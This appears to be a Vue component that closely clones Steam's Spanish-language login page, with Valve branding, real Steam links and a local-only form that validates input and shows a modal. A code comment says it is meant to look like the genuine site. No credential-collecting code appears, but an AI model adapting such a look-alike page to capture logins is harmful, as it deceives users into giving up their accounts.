<script setup>
import { ref } from "vue";

const email = ref("");
const password = ref("");
const remember = ref(false);
const showModal = ref(false); 

const handleSubmit = () => {
  if (!email.value || password.value.length < 6) {
    return alert(
      "Todos los campos son obligatorios y la contraseña debe tener al menos 6 caracteres."
    );
  }
  showModal.value = true;
};

const closeModal = () => {
  showModal.value = false; 
};
</script>


<-- Aquello que no tiene el a=# es qp no le he puesto q lo redireccione a la
pagina original de steam, dando a entender como si fuera la de adeveras xd-->
<template>
  <div v-if="showModal" class="modal">
    <div class="modal-content">
      <span class="close" @click="closeModal">&times;</span>
      <img src="./assets/splash.png" alt="Bienvenido a Steam" class="modal-img" />
    </div>
  </div>
  <div class="navbar">
    <div class="navbar-content">
      <div class="logo">
        <a href="https://store.steampowered.com/?snr=1_60_4__global-header">
          <img
            src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016"
            width="176"
            height="44"
          />
        </a>
      </div>
      <div class="navbar-links">
        <!-- Dropdown Tienda -->
        <div class="dropdown">
          <button class="dropbtn">TIENDA</button>
          <div class="dropdown-content">
            <a href="#">Inicio</a>
            <a href="#">Lista de descubrimientos</a>
            <a href="#">Lista de deseados</a>
            <a href="#">Tienda de puntos</a>
            <a href="#">Noticias</a>
            <a href="#">Estadísticas</a>
          </div>
        </div>

        <!-- Dropdown Comunidad -->
        <div class="dropdown">
          <button class="dropbtn">COMUNIDAD</button>
          <div class="dropdown-content">
            <a href="#">Inicio</a>
            <a href="#">Discusiones</a>
            <a href="#">Workshop</a>
            <a href="#">Mercado</a>
            <a href="#">Retransmisión</a>
          </div>
        </div>

        <!-- Enlace de Acerca de -->
        <a
          href="https://store.steampowered.com/about/?snr=1_60_4__global-header"
          >ACERCA DE</a
        >
        <!-- Enlace de Soporte -->
        <a href="https://help.steampowered.com/es/">SOPORTE</a>
      </div>
      <div class="navbar-action-download">
        <a
          href="https://store.steampowered.com/about/?snr=1_60_4__global-header"
          class="install-link"
          >Instalar Steam</a
        >
      </div>
      <div class="navbar-action-login">
        <a href="#" class="login-link">Iniciar sesión</a>
      </div>
    </div>
  </div>

  <div class="page-content">
    <div class="login-container">
      <div class="login-left">
        <div class="login-form">
          <div class="form-header">
            <p>INICIA SESIÓN CON TU NOMBRE DE CUENTA</p>
          </div>
          <form @submit.prevent="handleSubmit">
            <div class="form-group">
              <input
                type="text"
                placeholder="Nombre de cuenta"
                v-model.trim="email"
                class="input-field"
              />
            </div>
            <div class="form-bottom">
              <p>CONTRASEÑA</p>
            </div>
            <div class="form-group">
              <input
                type="password"
                placeholder="Contraseña"
                v-model.trim="password"
                class="input-field"
              />
            </div>
            <div class="remember-me">
              <input type="checkbox" id="remember" v-model="remember" />
              <label for="remember">Recordarme</label>
            </div>
            <div class="form-group">
              <button type="submit" class="submit-button">
                Iniciar sesión
              </button>
            </div>
          </form>
          <div class="help-link">
            <a href="#">Ayuda, no puedo iniciar sesión</a>
          </div>
        </div>
      </div>
      <div class="login-right">
        <div class="qr-section">
  <p>O BIEN CON UN CÓDIGO QR</p>
  <div class="qr-code">
    <div class="qr-image">
      <!-- Aquí va la imagen del código QR -->
      <img src="./assets/qr.png" alt="Código QR de Steam" class="qr-placeholder">
      <div class="qr-icon"></div>
    </div>
  </div>
  <p class="qr-info">
    Usa la
    <a href="https://store.steampowered.com/mobile">aplicación Steam Mobile</a>
    para iniciar sesión con un código QR
  </p>
</div>
      </div>
    </div>
  </div>

  <footer class="footer">
    <div class="footer-new-user">
  <div class="left-align-container">
    <a class="new-user-text">¿Es la primera vez que usas Steam?</a>
    <button type="submit" class="create-button">Crea una cuenta</button>
  </div>
  <p class="footer-text">
    Es gratis y muy fácil. Descubre miles de juegos para jugar con
    millones de nuevos amigos. Más información acerca de Steam
  </p>
</div>

    <div class="footer-content">
      <!-- Info -->
      <div class="footer-legal">
        <div class="image-container">
          <img
            src="./assets/footerLogo_valve_new.png"
            alt="Imagen izquierda"
            class="footer-image-left"
          />
          <img
            src="./assets/logo_steam_footer.png"
            alt="Imagen derecha"
            class="footer-image-right"
          />
        </div>
        <p>
          © 2025 Valve Corporation. Todos los derechos reservados. Todas las
          marcas registradas pertenecen a sus respectivos dueños en EE. UU. y
          otros países.
        </p>
        <p>
          Todos los precios incluyen IVA (donde sea aplicable).  
          <a
            href="https://store.steampowered.com/privacy_agreement/"
            target="_blank"
            >Política de Privacidad</a
          >
            |  
          <a href="https://www.valvesoftware.com/es/legal" target="_blank"
            >Información legal</a
          >
            |  
          <a
            href="https://store.steampowered.com/subscriber_agreement/"
            target="_blank"
            >Acuerdo de Suscriptor a Steam</a
          >
            |  
          <a
            href="https://store.steampowered.com/account/cookiepreferences/?snr=1_44_44_"
            target="_blank"
            >Cookies</a
          >
        </p>
      </div>

      <!-- enlaces -->
      <div class="footer-links">
        <a href="https://www.valvesoftware.com/es/about" target="_blank"
          >Acerca de Valve</a
        >
          |  
        <a href="https://www.valvesoftware.com/es/jobs" target="_blank"
          >Empleo</a
        >
          |  
        <a href="https://partner.steamgames.com/" target="_blank">Steamworks</a>
          |  
        <a href="https://store.steampowered.com/about/" target="_blank"
          >Distribución de Steam</a
        >
          |  
        <a
          href="https://help.steampowered.com/es-419/?snr=1_44_44_"
          target="_blank"
          >Soporte</a
        >
          |  
        <a
          href="https://store.steampowered.com/digitalgiftcards/"
          target="_blank"
          >Tarjetas regalo</a
        >
          |  
        <a
          href="https://www.facebook.com/Steam"
          target="_blank"
          aria-label="Facebook"
        >
          <img src="./assets/ico_facebook.png" alt="Facebook" />
        </a>
        <a
          href="https://twitter.com/Steam"
          target="_blank"
          aria-label="Twitter"
        >
            |  
          <img src="./assets/ico_twitter.png" alt="Twitter" />
        </a>
        <a href="https://www.bsky.com/Steam" target="_blank" aria-label="bsky">
            |  
          <img src="./assets/ico_bsky.png" alt="bsky" />
        </a>
      </div>
    </div>
  </footer>
</template>

<style scoped>
/* Modal */
.modal {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.7);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.modal-content {
  background: #1b2838;
  padding: 20px;
  border-radius: 8px;
  text-align: center;
  color: white;
  position: relative;
  max-width: 400px;
}

.modal-img {
  width: 100%;
  border-radius: 5px;
}

.close {
  position: absolute;
  top: 10px;
  right: 15px;
  font-size: 24px;
  cursor: pointer;
  color: white;
}
.close:hover {
  color: #f39c12;
}
.dropbtn {
  background-color: #171a21;
  color: #b6b7b4;
  font-size: 14px;
  text-transform: uppercase;
  font-weight: 500;
  border: none;
  cursor: pointer;
  padding: 8px 0;
  text-align: center;
}

.dropbtn:hover {
  color: #dcdedf;
}

.dropdown {
  position: relative;
  display: inline-block;
}

.dropdown-content {
  display: none;
  position: absolute;
  background-color: #3d4450;
  min-width: 160px;
  z-index: 1;
  box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
  border-radius: 4px;
  color: #ffffff;
}

.dropdown-content a {
  font-size: x-small;
  color: #ffffff;
  padding: 12px 20px;
  text-decoration: none;
  display: block;
}

.dropdown-content a:hover {
  background-color: #dcdedf;
  color: #dcdedf;
}

.dropdown:hover .dropdown-content {
  display: block;
}

.footer-legal {
  position: relative;
  padding: 25px;
}

.image-container {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  display: flex;
  justify-content: space-between;
}

.footer-image-left,
.footer-image-right {
  width: auto;
  height: 25px;
}

.footer-new-user {
  display: flex;
  justify-content: center;
  align-items: center;
  max-width: 600px;
  margin: 0 auto;
}

.left-align-container {
  display: flex;
  flex-direction: column;
  align-items: center; 
  width: 150%; 
  text-align: center; 
}

.new-user-text {
  color: #ffffff;
  font-size: 20px;
  width: 80%;
  margin-bottom: 10px;
  font-weight: bold;
}

.create-button {
  padding: 10px 20px;
  background-color: #1999ff;
  color: white;
  border: none;
  border-radius: 4px;
  font-size: 14px;
  margin-top: 10px; 
}

.create-button:hover {
  background-color: #3ba8ff;
}

.footer-text {
  color: #b8b6b4;
  font-size: 12px;
  margin: 0;
  text-align: center;
  width: 100%;
}

.footer-divider {
  width: 100%;
  height: 1px;
  background-color: rgba(255, 255, 255, 0.2);
}

.footer {
  background-color: #171a21;
  padding: 20px 0;
  color: #acb2b8;
  font-size: 12px;
  text-align: center;
}

.footer-content {
  max-width: 940px;
  margin: 0 auto;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding-top: 10px;
  border-top: 1px solid rgba(255, 255, 255, 0.2);
  margin-top: 10px;
}

.footer-social {
  margin-bottom: 20px;
}

.footer-social a {
  margin: 0 10px;
}

.footer-social img {
  width: 24px;
  height: 24px;
}

.footer-links {
  display: flex;
  align-items: center;
  justify-content: center;
  flex-wrap: wrap;
  gap: 20px;
  padding-top: 10px;
  border-top: 1px solid rgba(255, 255, 255, 0.2);
  margin-top: -20px;
}

.footer-links a {
  color: #acb2b8;
  text-decoration: none;
  font-size: 12px;
  display: flex;
  align-items: center;
}

.footer-links img {
  width: 16px;
  height: 16px;
  margin-left: 5px;
}

.footer-legal p {
  margin: 5px 0;
}

.footer-legal a {
  color: #acb2b8;
  text-decoration: none;
}

.footer-legal a:hover {
  color: #ffffff;
}

.body {
  color: #acb2b8;
  font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
  margin: 0;
  padding: 0;
}

.navbar {
  background-color: #171a21;
  width: 100%;
  height: 104px;
  display: flex;
  justify-content: center;
}

.navbar-content {
  width: 940px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0 16px;
}

.logo {
  margin-right: 40px;
}

.navbar-links {
  display: flex;
  gap: 20px;
  font-size: 14px;
  text-transform: uppercase;
  font-weight: 500;
}

.navbar-links a {
  color: #b6b7b4;
  text-decoration: none;
  padding: 8px 0;
}

.selected-link {
  color: #67c1f5 !important;
  position: relative;
}

.selected-link::after {
  content: "";
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  height: 4px;
  background-color: #67c1f5;
}

.navbar-action-login {
  display: flex;
  align-items: center;
  font-size: 12px;
}

.navbar-action-download {
  display: flex;
  align-items: center;
  font-size: 12px;
  background-color: #5c7e13;
  font-weight: bold;
  color: white;
}

.install-link,
.login-link {
  color: #b8b6b4;
  text-decoration: none;
}

.install-link:hover,
.login-link:hover,
.navbar-links a:hover {
  color: #ffffff;
}

.page-content {
  background-image: url("./assets/steam_share_image.jpg");
  background-size: cover;
  background-repeat: no-repeat;
  background-position: center;

  min-height: calc(100vh - 164px);
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px 0;
}

.login-container {
  display: flex;
  width: 616px;
  border-radius: 4px;
  overflow: hidden;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
}

.login-left {
  flex: 1;
  background-color: #181a21;
  padding: 24px;
}

.login-right {
  width: 264px;
  background-color: #181a21;
  padding: 24px;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
}

.form-header p {
  color: #1999ff;
  font-size: 12px;
  margin: 0;
  text-transform: uppercase;
  font-weight: bold;
}

.form-group {
  margin-bottom: 16px;
}

.input-field {
  width: 100%;
  padding: 8px 10px;
  background-color: #32353c;
  border: none;
  border-radius: 2px;
  color: #e9e9e9;
  font-size: 14px;
  box-sizing: border-box;
}

.input-field:focus {
  outline: none;
  box-shadow: 0 0 2px #1999ff;
}

.remember-me {
  display: flex;
  align-items: center;
  margin-bottom: 16px;
  font-size: 12px;
  color: #acb2b8;
}

.remember-me input {
  margin-right: 5px;
  color: #acb2b8;
}

.submit-button {
  width: 100%;
  padding: 10px;
  background-color: #1999ff;
  color: white;
  border: none;
  border-radius: 2px;
  cursor: pointer;
  font-size: 16px;
  transition: background-color 0.2s;
}

.submit-button:hover {
  background-color: #3ba8ff;
}

.help-link {
  margin-top: 20px;
  text-align: center;
}

.help-link a {
  color: #acb2b8;
  font-size: 12px;
  text-decoration: none;
}

.help-link a:hover {
  color: #ffffff;
  text-decoration: underline;
}

.qr-section p:first-child {
  color: #1999ff;
  font-size: 12px;
  margin-bottom: 15px;
  font-weight: bold;
  text-transform: uppercase;
}

.qr-code {
  margin: 15px 0;
}

.qr-image {
  position: relative;
  width: 180px;
  height: 180px;
  margin: 0 auto;
}

.qr-placeholder {
  width: 100%;
  height: 100%;
  border-radius: 10px;
}

.qr-info {
  font-size: 12px;
  line-height: 1.4;
  color: #acb2b8;
  margin-top: 15px;
}

.qr-info a {
  color: #acb2b8;
  text-decoration: underline;
}

.qr-info a:hover {
  color: #ffffff;
}

.footer {
  background-color: #171a21;
  color: #8f98a0;
  padding: 16px;
  font-size: 12px;
  text-align: center;
}

.form-bottom p {
  color: #575a5f;
  font-size: 12px;
  margin: 0;
  text-transform: uppercase;
  font-weight: bold;
}
</style>
